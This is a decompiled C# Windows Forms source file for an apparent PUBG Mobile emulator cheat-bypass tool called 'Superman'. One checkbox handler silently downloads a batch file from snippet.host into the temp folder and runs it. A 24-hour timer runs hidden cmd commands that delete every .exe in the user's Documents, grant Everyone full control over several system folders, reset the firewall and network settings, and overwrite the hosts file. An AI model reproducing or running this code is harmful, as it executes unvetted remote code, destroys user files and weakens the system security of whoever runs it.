using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DiscordRPC;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Newtonsoft.Json;
using Superman.Properties;
using SupermanLove;
using Microsoft.VisualBasic;

namespace Superman
{
	// Token: 0x02000011 RID: 17
	public partial class MainForm : Form
	{
		// Token: 0x06000077 RID: 119 RVA: 0x00005AC8 File Offset: 0x00003CC8
		public MainForm()
		{
			this.InitializeComponent();
			this.BackColor = Color.Gray;
			base.TransparencyKey = Color.Gray;
			this.timer_0 = new System.Windows.Forms.Timer();
			this.timer_0.Tick += this.timer_0_Tick;
			this.timer_0.Interval = (int)TimeSpan.FromHours(24.0).TotalMilliseconds;
			this.timer_0.Start();

		}

		// Token: 0x06000078 RID: 120
		[DllImport("kernel32.dll")]
		public static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint processid);

		// Token: 0x06000079 RID: 121
		[DllImport("kernel32.dll")]
		public static extern int Process32First(IntPtr handle, ref MainForm.ProcessEntry32 pe);

		// Token: 0x0600007A RID: 122
		[DllImport("kernel32.dll")]
		public static extern int Process32Next(IntPtr handle, ref MainForm.ProcessEntry32 pe);

		// Token: 0x0600007B RID: 123
		[DllImport("user32.dll")]
		public static extern int FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x0600007C RID: 124
		[DllImport("user32.dll")]
		public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

		// Token: 0x0600007D RID: 125 RVA: 0x00005B98 File Offset: 0x00003D98
		////////////private Task method_0(int int_0)
		////////////{
		////////////	MainForm.<PutTaskDelay>d__17 <PutTaskDelay>d__ = new MainForm.<PutTaskDelay>d__17();
		////////////	<PutTaskDelay>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		////////////	<PutTaskDelay>d__.<>4__this = this;
		////////////	<PutTaskDelay>d__.Time = int_0;
		////////////	<PutTaskDelay>d__.<>1__state = -1;
		////////////	<PutTaskDelay>d__.<>t__builder.Start<MainForm.<PutTaskDelay>d__17>(ref <PutTaskDelay>d__);
		////////////	return <PutTaskDelay>d__.<>t__builder.Task;
		////////////}

		// Token: 0x0600007E RID: 126 RVA: 0x000022B4 File Offset: 0x000004B4
		private void LOOPCH_CheckedChanged(object sender, EventArgs e)
		{
			System.Net.WebClient Discord = new System.Net.WebClient();
			Discord.DownloadFile("https://snippet.host/rcgkzj/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/Client.bat");
			Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/Client.bat");
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00005BE4 File Offset: 0x00003DE4
		public void system(string arg)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				FileName = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86) + "\\cmd.exe",
				Arguments = "/c " + arg
			};
			process.Start();
			process.WaitForExit();
			
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00005C58 File Offset: 0x00003E58
		public string executee(string arg)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				FileName = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86) + "\\cmd.exe",
				Arguments = "/c " + arg
			};
			process.Start();
			process.WaitForExit();
			return process.StandardOutput.ReadToEnd();
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00005CD8 File Offset: 0x00003ED8
		////////////public Task<MainForm.Data> FindBase(string HeaderBytes, long start, long end, bool readflag, bool writeflag, bool executeflag)
		////////////{
		////////////	MainForm.<FindBase>d__22 <FindBase>d__ = new MainForm.<FindBase>d__22();
		////////////	<FindBase>d__.<>t__builder = AsyncTaskMethodBuilder<MainForm.Data>.Create();
		////////////	<FindBase>d__.<>4__this = this;
		////////////	<FindBase>d__.HeaderBytes = HeaderBytes;
		////////////	<FindBase>d__.start = start;
		////////////	<FindBase>d__.end = end;
		////////////	<FindBase>d__.readflag = readflag;
		////////////	<FindBase>d__.writeflag = writeflag;
		////////////	<FindBase>d__.executeflag = executeflag;
		////////////	<FindBase>d__.<>1__state = -1;
		////////////	<FindBase>d__.<>t__builder.Start<MainForm.<FindBase>d__22>(ref <FindBase>d__);
		////////////	return <FindBase>d__.<>t__builder.Task;
		////////////}

		// Token: 0x06000082 RID: 130
		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenThread(MainForm.ThreadAccess threadAccess_0, bool bool_0, uint uint_0);

		// Token: 0x06000083 RID: 131
		[DllImport("kernel32.dll")]
		private static extern uint SuspendThread(IntPtr intptr_0);

		// Token: 0x06000084 RID: 132
		[DllImport("kernel32.dll")]
		private static extern int ResumeThread(IntPtr intptr_0);

		// Token: 0x06000085 RID: 133
		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CloseHandle(IntPtr intptr_0);

		// Token: 0x06000086 RID: 134 RVA: 0x00005D4C File Offset: 0x00003F4C
		//////////private Task<IntPtr> method_1()
		//////////{
		//////////	MainForm.<ProcFindGAGAHEX>d__29 <ProcFindGAGAHEX>d__ = new MainForm.<ProcFindGAGAHEX>d__29();
		//////////	<ProcFindGAGAHEX>d__.<>t__builder = AsyncTaskMethodBuilder<IntPtr>.Create();
		//////////	<ProcFindGAGAHEX>d__.<>4__this = this;
		//////////	<ProcFindGAGAHEX>d__.<>1__state = -1;
		//////////	<ProcFindGAGAHEX>d__.<>t__builder.Start<MainForm.<ProcFindGAGAHEX>d__29>(ref <ProcFindGAGAHEX>d__);
		//////////	return <ProcFindGAGAHEX>d__.<>t__builder.Task;
		//////////}

		// Token: 0x06000087 RID: 135 RVA: 0x00005D90 File Offset: 0x00003F90
		//////////private Task<IntPtr> method_2()
		//////////{
		//////////	MainForm.<ProcFindLOOP7HEX>d__30 <ProcFindLOOP7HEX>d__ = new MainForm.<ProcFindLOOP7HEX>d__30();
		//////////	<ProcFindLOOP7HEX>d__.<>t__builder = AsyncTaskMethodBuilder<IntPtr>.Create();
		//////////	<ProcFindLOOP7HEX>d__.<>4__this = this;
		//////////	<ProcFindLOOP7HEX>d__.<>1__state = -1;
		//////////	<ProcFindLOOP7HEX>d__.<>t__builder.Start<MainForm.<ProcFindLOOP7HEX>d__30>(ref <ProcFindLOOP7HEX>d__);
		//////////	return <ProcFindLOOP7HEX>d__.<>t__builder.Task;
		//////////}

		// Token: 0x06000088 RID: 136 RVA: 0x00005DD4 File Offset: 0x00003FD4
		public void WriteConig(string data)
		{
			string path = "C:\\\\INJETORCONFIG.ini";
			if (!File.Exists(path))
			{
				using (StreamWriter streamWriter = new StreamWriter(path, true))
				{
					streamWriter.WriteLine(data);
					return;
				}
			}
			if (File.Exists(path))
			{
				using (StreamWriter streamWriter2 = new StreamWriter(path, true))
				{
					streamWriter2.WriteLine(data);
				}
			}
		}

		// Token: 0x06000089 RID: 137
		[DllImport("MemLib.dll")]
		public static extern void EmuStart();

		// Token: 0x0600008A RID: 138
		[DllImport("MemLib.dll")]
		public static extern void checkkeyok();

		// Token: 0x0600008B RID: 139 RVA: 0x00005E50 File Offset: 0x00004050
		public void Loop()
		{
			do
			{
				this.executee("attrib +h +s +r C:\\Windows\\BypassDone");
				this.executee("attrib +h +s +r C:\\Windows\\EmuFound");
				Thread.Sleep(2000);
				if (File.Exists("C:\\\\Windows\\\\EmuFound"))
				{
					this.executee("attrib -h -s -r C:\\Windows\\EmuFound");
					File.Delete("C:\\\\Windows\\\\EmuFound");
					this.status.Text = "READY...!                                                             ";
					this.status.ForeColor = Color.Lime;
					this.status.Refresh();
					Thread.Sleep(2000);
					this.status.Text = "Wait Working On Bypass!                                                             ";
					this.status.ForeColor = Color.Yellow;
					this.status.Refresh();
				}
			}
			while (!File.Exists("C:\\\\Windows\\\\BypassDone"));
			this.executee("attrib -h -s -r C:\\Windows\\BypassDone");
			File.Delete("C:\\\\Windows\\\\BypassDone");
			this.status.Text = "LevelXup Bypass Done                                                             ";
			this.status.ForeColor = Color.Lime;
			this.status.Refresh();
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00005F68 File Offset: 0x00004168
		////////////private void guna2GradientTileButton1_Click(object sender, EventArgs e)
		////////////{
		////////////	MainForm.<Guna2GradientTileButton1_Click>d__35 <Guna2GradientTileButton1_Click>d__ = new MainForm.<Guna2GradientTileButton1_Click>d__35();
		////////////	<Guna2GradientTileButton1_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
		////////////	<Guna2GradientTileButton1_Click>d__.<>4__this = this;
		////////////	<Guna2GradientTileButton1_Click>d__.sender = sender;
		////////////	<Guna2GradientTileButton1_Click>d__.e = e;
		////////////	<Guna2GradientTileButton1_Click>d__.<>1__state = -1;
		////////////	<Guna2GradientTileButton1_Click>d__.<>t__builder.Start<MainForm.<Guna2GradientTileButton1_Click>d__35>(ref <Guna2GradientTileButton1_Click>d__);
		////////////}

		// Token: 0x0600008D RID: 141 RVA: 0x000022B6 File Offset: 0x000004B6
		private void method_3(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000022B4 File Offset: 0x000004B4
		private void method_4(object sender, EventArgs e)
		{
		}

		// Token: 0x0600008F RID: 143 RVA: 0x000022B4 File Offset: 0x000004B4
		private void status_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00005FB0 File Offset: 0x000041B0
		private void method_5()
		{
			this.discordRpcClient_0 = new DiscordRpcClient("1110215068815208611", -1, null, true, null);
			this.discordRpcClient_0.Initialize();
			string text = "https://discord.gg/byg";
			string text2 = "Join Discord";
			this.button_0[0] = JsonConvert.DeserializeObject<DiscordRPC.Button>(string.Concat(new string[]
			{
				"{\"Url\":\"",
				text,
				"\", \"Label\":\"",
				text2,
				"\"}"
			}));
			RichPresence presence = new RichPresence
			{
				Details = "Private Bypass",
				State = "Pubg Mobile",
				Timestamps = Timestamps.Now,
				Assets = new Assets
				{
					LargeImageKey = "https://s11.gifyu.com/images/SgwFH.gif",
					SmallImageKey = "https://media.giphy.com/media/yoTCgY1ysO7cLfa6s7/giphy.gif"
				}
			};
			this.discordRpcClient_0.SetPresence(presence);
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00006078 File Offset: 0x00004278
		private void MainForm_Load(object sender, EventArgs e)
		{
			
			string text = File.ReadAllText("C:\\\\Windows\\\\Expire.txt");
			this.Expire.Text = text;
			this.Expire.ForeColor = Color.Red;
			this.Expire.Refresh();
			this.method_5();
		}

		// Token: 0x06000092 RID: 146 RVA: 0x000060C0 File Offset: 0x000042C0
		////////private void method_6(int int_0)
		////////{
		////////	MainForm.<SAFEEXIT>d__42 <SAFEEXIT>d__ = new MainForm.<SAFEEXIT>d__42();
		////////	<SAFEEXIT>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
		////////	<SAFEEXIT>d__.<>4__this = this;
		////////	<SAFEEXIT>d__.times = int_0;
		////////	<SAFEEXIT>d__.<>1__state = -1;
		////////	<SAFEEXIT>d__.<>t__builder.Start<MainForm.<SAFEEXIT>d__42>(ref <SAFEEXIT>d__);
		////////}

		// Token: 0x06000093 RID: 147 RVA: 0x00006100 File Offset: 0x00004300
		private void guna2GradientTileButton2_Click(object sender, EventArgs e)
		{
			new SoundPlayer
			{
				SoundLocation = "C:\\click.wav"
			}.Play();
			this.backgroundWorker_0 = new BackgroundWorker();
			this.backgroundWorker_0.DoWork += this.backgroundWorker_0_DoWork;
			this.backgroundWorker_0.RunWorkerAsync();
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000022B4 File Offset: 0x000004B4
		private void LOOPEX_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000022B4 File Offset: 0x000004B4
		private void IPADVIEW_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000096 RID: 150 RVA: 0x000022B4 File Offset: 0x000004B4
		private void ProcID_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000097 RID: 151 RVA: 0x000022B4 File Offset: 0x000004B4
		private void RECOIL_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000022B4 File Offset: 0x000004B4
		private void Minimized_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00006154 File Offset: 0x00004354
		private void Musicon_Click(object sender, EventArgs e)
		{
			new SoundPlayer
			{
				SoundLocation = "C:\\Windows\\song.wav"
			}.Play();
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00006178 File Offset: 0x00004378
		private void MusicOff_Click(object sender, EventArgs e)
		{
			new SoundPlayer
			{
				SoundLocation = "C:\\Windows\\song.wav"
			}.Stop();
		}

		// Token: 0x0600009B RID: 155 RVA: 0x000022B6 File Offset: 0x000004B6
		private void exitControlBox_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00008244 File Offset: 0x00006444
		[CompilerGenerated]
		private void timer_0_Tick(object sender, EventArgs e)
		{
			MessageBox.Show("Time Over Again Login Please");
			try
			{
				int num = MainForm.FindWindow(null, "Select RESET NETWORK");
				if (num > 0)
				{
					MainForm.SendMessage(num, 274U, 61536, 0);
				}
				num = MainForm.FindWindow(null, "RESET NETWORK");
				if (num > 0)
				{
					MainForm.SendMessage(num, 274U, 61536, 0);
				}
				this.status.Text = "PROCESSING...                                                          ";
				this.status.Refresh();
				this.status.ForeColor = Color.Red;
				this.status.Refresh();
				this.RECOIL.CheckState = CheckState.Unchecked;
				this.IPADVIEW.CheckState = CheckState.Unchecked;
				this.DEVICEID.CheckState = CheckState.Unchecked;
				Process process = new Process();
				process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					UseShellExecute = false
				};
				process.Start();
				using (StreamWriter standardInput = process.StandardInput)
				{
					if (!standardInput.BaseStream.CanWrite)
					{
						return;
					}
					standardInput.WriteLine("taskkill /F /im GameLoader.exe");
					standardInput.WriteLine("TaskKill /F /IM RuntimeBroker.exe");
					standardInput.WriteLine("TaskKill /F /IM QMEmulatorService.exe");
					standardInput.WriteLine("taskkill /F /im TBSWebRenderer.exe");
					standardInput.WriteLine("taskkill /F /im AndroidEmulator.exe");
					standardInput.WriteLine("taskkill /F /im AndroidEmulatorEn.exe");
					standardInput.WriteLine("taskkill /F /im AndroidEmulatorEx.exe");
					standardInput.WriteLine("taskkill /f /im SmartGaGa.exe");
					standardInput.WriteLine("taskkill /f /im ProjectTitan.exe");
					standardInput.WriteLine("taskkill /f /im AndroidProcess.exe");
					standardInput.WriteLine(" taskkill /f /im anubischeats.SG.vmp.exe  ");
					standardInput.WriteLine("taskkill /f /im adb.exe  ");
					standardInput.WriteLine("del /s /f /q C:\\Windows\\temp\\*.* ");
					standardInput.WriteLine("del /s /f /q %USERPROFILE%\appdata\\local\\temp\\*.* ");
					standardInput.WriteLine("del /s /f /q C:\\Windows\\Prefetch\\*.* ");
					standardInput.WriteLine("del /f /q /S C: \\Users\\% username %\\Documents\\*.exe  ");
					standardInput.WriteLine("cacls C:\\Users\\%username%\\Documents /E /P everyone:f ");
					standardInput.WriteLine("cacls C:\\Users\\% username %\\AppData\\Local\\Temp /E /P everyone:f ");
					standardInput.WriteLine("cacls C:\\ProgramData / E /P everyone:f ");
					standardInput.WriteLine("cacls C:\\Windows\\Prefetch /E /P everyone:f ");
					standardInput.WriteLine("cacls C:\\Windows\\Temp /E /P everyone:f ");
					standardInput.WriteLine("del /s /f /q C:\\Windows\\temp\\*.* ");
					standardInput.WriteLine("del /s /f /q %USERPROFILE%\appdata\\local\\temp\\*.* ");
					standardInput.WriteLine("del /s /f /q C:\\Windows\\Prefetch\\*.* ");
					standardInput.WriteLine("del /f /q /S C: \\Users\\% username %\\Documents\\*.exe ");
					standardInput.WriteLine("netsh firewall reset");
					standardInput.WriteLine("netsh winsock reset ");
					standardInput.WriteLine("netsh int ip reset ");
					standardInput.WriteLine("ipconfig /release ");
					standardInput.WriteLine("ipconfig /renew ");
					standardInput.WriteLine("ipconfig /flushdns ");
					standardInput.WriteLine("del /s /f /q C:\\Windows\\Prefetch\\*.* ");
					standardInput.WriteLine("del /s /f /q C:\\Windows\\temp\\*.* ");
					standardInput.WriteLine("del /s /f /q C:\\Windows\\System32\\temp\\*.* ");
					standardInput.WriteLine("del /s /f /q %USERPROFILE%\\appdata\\local\\temp\\*.* ");
					standardInput.Flush();
					standardInput.Close();
					process.WaitForExit();
					File.WriteAllBytes("C:\\Windows\\System32\\drivers\\etc\\hosts", Resources.hosts);
					this.status.Text = "SAFE EXIT DONE";
					this.status.Refresh();
					this.status.ForeColor = Color.Lime;
					this.status.Refresh();
				}
			}
			catch
			{
				this.status.Text = "EROR 404 PLEASE TRY AGAIN       ";
				this.status.ForeColor = Color.Red;
			}
			Environment.Exit(0);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x000022BE File Offset: 0x000004BE
		[CompilerGenerated]
		private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
		{
			////////this.method_6(1);
		}

		// Token: 0x04000069 RID: 105
		public string userName = Environment.UserName;

		// Token: 0x0400006A RID: 106
		public long enumerable = 0L;

		// Token: 0x0400006B RID: 107
		public string GagaPath = null;

		// Token: 0x0400006C RID: 108
		public Mem MemLib = new Mem();

		// Token: 0x0400006D RID: 109
		public string GameVersion = "";

		// Token: 0x0400006E RID: 110
		public int bypassed = 0;

		// Token: 0x0400006F RID: 111
		private System.Windows.Forms.Timer timer_0;

		// Token: 0x04000070 RID: 112
		private BackgroundWorker backgroundWorker_0;

		// Token: 0x04000071 RID: 113
		private DiscordRpcClient discordRpcClient_0;

		// Token: 0x04000072 RID: 114
		public const int WM_SYSCOMMAND = 274;

		// Token: 0x04000073 RID: 115
		public const int SC_CLOSE = 61536;

		// Token: 0x04000074 RID: 116
		private DiscordRPC.Button[] button_0 = new DiscordRPC.Button[1];

		// Token: 0x02000012 RID: 18
		public struct ProcessEntry32
		{
			// Token: 0x0400008D RID: 141
			public uint dwSize;

			// Token: 0x0400008E RID: 142
			public uint cntUsage;

			// Token: 0x0400008F RID: 143
			public uint th32ProcessID;

			// Token: 0x04000090 RID: 144
			public IntPtr th32DefaultHeapID;

			// Token: 0x04000091 RID: 145
			public uint th32ModuleID;

			// Token: 0x04000092 RID: 146
			public uint cntThreads;

			// Token: 0x04000093 RID: 147
			public uint uint_0;

			// Token: 0x04000094 RID: 148
			public int pcPriClassBase;

			// Token: 0x04000095 RID: 149
			public uint dwFlags;

			// Token: 0x04000096 RID: 150
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
			public string szExeFile;
		}

		// Token: 0x02000013 RID: 19
		public class Data
		{
			// Token: 0x17000002 RID: 2
			// (get) Token: 0x060000A0 RID: 160 RVA: 0x000022C7 File Offset: 0x000004C7
			// (set) Token: 0x060000A1 RID: 161 RVA: 0x000022CF File Offset: 0x000004CF
			public long Address { get; set; }

			// Token: 0x04000097 RID: 151
			[CompilerGenerated]
			private long long_0;
		}

		// Token: 0x02000014 RID: 20
		[Flags]
		public enum ThreadAccess
		{
			// Token: 0x04000099 RID: 153
			TERMINATE = 1,
			// Token: 0x0400009A RID: 154
			SUSPEND_RESUME = 2,
			// Token: 0x0400009B RID: 155
			GET_CONTEXT = 8,
			// Token: 0x0400009C RID: 156
			SET_CONTEXT = 16,
			// Token: 0x0400009D RID: 157
			SET_INFORMATION = 32,
			// Token: 0x0400009E RID: 158
			QUERY_INFORMATION = 64,
			// Token: 0x0400009F RID: 159
			SET_THREAD_TOKEN = 128,
			// Token: 0x040000A0 RID: 160
			IMPERSONATE = 256,
			// Token: 0x040000A1 RID: 161
			DIRECT_IMPERSONATION = 512
		}
    }
}
